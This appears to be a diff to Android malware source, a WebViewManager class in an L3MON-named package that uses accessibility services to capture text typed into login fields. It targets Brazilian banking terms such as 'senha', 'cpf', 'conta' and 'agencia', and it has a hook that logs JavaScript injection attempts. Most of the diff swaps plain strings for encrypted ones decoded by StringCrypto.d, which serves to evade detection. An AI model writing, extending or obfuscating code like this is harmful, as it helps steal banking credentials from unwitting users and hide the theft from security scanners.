@@ -1,9 +1,13 @@
 package com.etechd.l3mon.managers;
 
 import android.view.accessibility.AccessibilityNodeInfo;
+
 import org.json.JSONObject;
+
 import java.util.ArrayList;
 import java.util.List;
+
+import com.etechd.l3mon.StringCrypto;
 
 public class WebViewManager {
 
@@ -14,7 +18,14 @@ public class WebViewManager {
     };
 
     private static final String[] LOGIN_KEYWORDS = {
-            "senha", "password", "pass", "login", "email", "cpf", "conta", "agencia"
+            StringCrypto.d("gu3MjvrbZ7NlCWX+QXDeZQ=="), // "senha"
+            StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), // "password"
+            StringCrypto.d("D5RaM2GMTgBcvYb98ax+3A=="), // "pass"
+            StringCrypto.d("aai9LdH0KRxjk0xdMjETsA=="), // "login"
+            StringCrypto.d("BwgaiWjIQxc6tQa7iEWO3w=="), // "email"
+            StringCrypto.d("hOVnOATq5/btWmhjoreTmQ=="), // "cpf"
+            StringCrypto.d("n+XOJruOgAA7SqHBsUbKsA=="), // "conta"
+            StringCrypto.d("uTvM5j3RGpDc6pKGSQFoTQ==") // "agencia"
     };
 
     /**
@@ -70,12 +81,13 @@ public class WebViewManager {
         if (node.isEditable()) {
             try {
                 JSONObject field = new JSONObject();
-                field.put("text", node.getText() != null ? node.getText().toString() : "");
-                field.put("description",
+                field.put(StringCrypto.d("/sagTjhasb91obJdF7CTZQ=="), // "text"
+                        node.getText() != null ? node.getText().toString() : "");
+                field.put(StringCrypto.d("TOhZupsy3J8qekWoaO89cg=="), // "description"
                         node.getContentDescription() != null ? node.getContentDescription().toString() : "");
-                field.put("viewId", node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
-                field.put("timestamp", System.currentTimeMillis());
-
+                field.put(StringCrypto.d("BFHpcyowlm16UIaM+JbYBw=="), // "viewId"
+                        node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
+                field.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
                 fields.add(field);
             } catch (Exception ignored) {
             }
@@ -132,19 +144,15 @@ public class WebViewManager {
 
     /**
      * Tenta injetar JavaScript (limitado via Accessibility)
-     * Na prática, isso geralmente é feito via addJavascriptInterface no app
-     * original
      */
     public void attemptJSInjection(AccessibilityNodeInfo webViewNode, String jsCode) {
-        // Nota: Injeção real de JS via AccessibilityService é muito limitada.
-        // A forma mais comum é usar evaluateJavascript() quando temos referência ao
-        // WebView.
-        // Aqui apenas logamos a intenção.
         try {
             JSONObject event = new JSONObject();
-            event.put("action", "webview_js_injection_attempt");
-            event.put("jsCode", jsCode);
-            event.put("timestamp", System.currentTimeMillis());
+            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="),
+                    StringCrypto.d("n6a+H5p9z5tFo8wZrJWoGOYJCe9pZy+DbB1TVJ7uX3g=")); // "action" =
+                                                                                     // "webview_js_injection_attempt"
+            event.put(StringCrypto.d("4e59UkvckenVsmKkcw8gZg=="), jsCode); // "jsCode"
+            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
 
             // ConnectionManager.ioSocket.emit("0xWV", event);
         } catch (Exception e) {
